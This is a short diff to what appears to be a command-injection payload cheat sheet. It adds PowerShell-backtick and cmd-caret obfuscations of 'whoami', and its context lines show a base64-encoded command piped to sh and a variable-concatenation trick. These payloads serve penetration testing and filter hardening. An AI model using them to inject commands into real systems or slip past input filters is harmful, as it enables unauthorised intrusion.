@@ -174,6 +174,17 @@ a=l;b=s;$a$b
 echo Y2F0IGluZGV4LnBocAo=|base64 -d|sh
 ```
 
+#### Bypass with \` in powershell
+
+```powershell
+w`h`o`am`i
+```
+#### Bypass with ^ in cmd
+
+```powershell
+w^h^o^am^i
+```
+
 
 ## Challenge
 
